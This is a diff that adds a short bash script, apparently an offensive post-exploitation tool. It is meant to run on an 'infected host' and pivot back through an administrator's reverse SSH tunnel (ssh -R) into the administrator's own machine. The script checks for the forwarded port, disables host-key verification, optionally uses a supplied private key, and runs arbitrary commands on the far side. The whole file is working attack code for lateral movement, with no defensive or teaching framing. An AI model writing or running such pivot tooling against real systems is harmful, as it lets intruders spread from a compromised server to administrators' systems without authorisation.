@@ -1,0 +1,18 @@
+#!/usr/bin/env bash
+# Admin used ssh -R (no -A). Their sshd is reachable on infected host via tunnel port.
+set -euo pipefail
+TUNNEL_PORT="${TUNNEL_PORT:-3322}"
+TUNNEL_BIND="${TUNNEL_BIND:-127.0.0.1}"
+ADMIN_USER="${ADMIN_USER:-admin}"
+KEY="${KEY:-}"
+
+if ! ss -tlnH | grep -qE "${TUNNEL_BIND}:${TUNNEL_PORT}\\s"; then
+  echo "[-] No tunnel on ${TUNNEL_BIND}:${TUNNEL_PORT}"
+  exit 1
+fi
+
+SSH_OPTS=(-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p "$TUNNEL_PORT")
+[[ -n "$KEY" && -r "$KEY" ]] && SSH_OPTS=(-i "$KEY" "${SSH_OPTS[@]}")
+
+echo "[+] RemoteForward pivot -> ${ADMIN_USER}@${TUNNEL_BIND}:${TUNNEL_PORT}"
+ssh "${SSH_OPTS[@]}" "${ADMIN_USER}@${TUNNEL_BIND}" "${REMOTE_CMD:-whoami; hostname; id}"
